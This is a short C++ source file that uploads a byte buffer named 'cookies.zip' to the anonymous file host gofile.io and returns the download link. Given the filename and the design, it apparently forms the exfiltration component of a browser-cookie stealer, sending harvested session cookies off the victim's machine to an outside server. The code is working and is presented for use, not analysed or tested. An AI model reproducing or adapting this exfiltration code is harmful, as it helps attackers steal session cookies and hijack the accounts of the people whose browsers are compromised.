#include "GoFileUpload.h"

std::string gritz::upload::GoFileUpload::upload(std::vector<uint8_t> data)
{
	std::string server = getServer();
	cpr::Url url("https://" + server + ".gofile.io/uploadFile");

	cpr::Buffer buffer
	{
		data.begin(), data.end(),
		cpr::fs::path { "cookies.zip" }
	};

	cpr::Multipart multipart
	{
		cpr::Part
		{
			"file",
			buffer,
			"application/octet-stream"
		}
	};

	cpr::Response response = cpr::Post(url, multipart);

	if (response.status_code == 200)
	{
		json responseJson = json::parse(response.text);

		return responseJson["data"]["downloadPage"].get<std::string>();
	}

	return {};
}

std::string gritz::upload::GoFileUpload::getServer()
{
	cpr::Response response = cpr::Get(cpr::Url("https://api.gofile.io/servers"));

	if (response.status_code == 200)
	{
		json data = json::parse(response.text);
		json servers = data["data"]["servers"];
		json closest = servers.at(1);

		return closest["name"].get<std::string>();
	}

	return {};
}
